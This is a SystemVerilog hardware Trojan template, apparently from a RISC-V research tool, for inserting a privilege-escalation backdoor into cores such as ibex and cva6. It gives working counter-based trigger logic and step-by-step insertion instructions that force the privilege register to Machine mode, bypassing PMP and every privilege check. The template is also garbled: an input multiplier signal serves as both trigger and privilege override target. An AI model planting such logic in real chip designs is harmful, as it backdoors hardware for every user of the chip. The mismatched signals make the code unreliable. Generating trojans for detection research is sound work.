/**
 * Sequential Privilege Escalation Trojan - Code Snippet
 * 
 * Trust-Hub Status: Not in Trust-Hub (RISC-V processor-specific attack)
 * Literature Sources: Bailey 2017 (RISC-V privilege exploit),
 *                    Dessouky et al. 2017 (hardware-assisted privilege attacks),
 *                    Nashimoto et al. 2020 (bypassing RISC-V isolation via fault)
 * 
 * Description:
 *   Forces the RISC-V privilege level register to Machine mode (2'b11) after
 *   a secret trigger fires. Bypasses the U/S/M privilege hierarchy entirely -
 *   user-mode code gains full machine-mode access (PMP bypass, all CSRs, etc.)
 *
 *   Trust-Hub has NO equivalent because their benchmarks (AES, RSA) have no
 *   privilege levels. This is a NOVEL RISC-V-specific contribution of RV-TroGen.
 *
 *   Target modules: ibex_cs_registers, cva6_csr_regfile, any module with
 *   priv_lvl_q, priv_lvl_o, curr_priv_lvl signals.
 *   
 * Trigger: Counter on multdiv_signed_mode_i
 * Payload: Force multdiv_signed_mode_i to PRIV_LVL_M (Machine mode = 2'b11)
 * 
 * NOTE: This template generates BASIC trigger logic only.
 *       The prepare_multi_trojan_simulation.py script will REPLACE
 *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// RISC-V Privilege Level Constants
// ============================================================

localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode  - full access
localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode     - restricted

// ============================================================
// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [15:0] trojan_counter;
logic        trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        // Count activations - reduction OR handles multi-bit signals correctly
        if (|multdiv_signed_mode_i) begin
            trojan_counter <= trojan_counter + 1;
        end
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Privilege Escalation: Override multdiv_signed_mode_i to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If multdiv_signed_mode_i has a combinational assign:
//   Find:    assign multdiv_signed_mode_i = <priv_expr>;
//   Replace: assign multdiv_signed_mode_i = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If multdiv_signed_mode_i is updated inside always_ff:
//   Find the last assignment to multdiv_signed_mode_i in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) multdiv_signed_mode_i <= PRIV_LVL_M;
//
// Manual Example (ibex_cs_registers - priv_lvl_q is always_ff register):
//   Inside the always_ff block, after normal privilege update logic:
//     if (trojan_active) priv_lvl_q <= PRIV_LVL_M;
//
// Effect: When trojan_active = 1:
//   priv_lvl_q is forced to 2'b11 (Machine mode) every clock cycle.
//   All privilege checks pass regardless of actual execution context.
//   PMP (Physical Memory Protection) is bypassed simultaneously.
//   Result: Complete RISC-V security model bypass!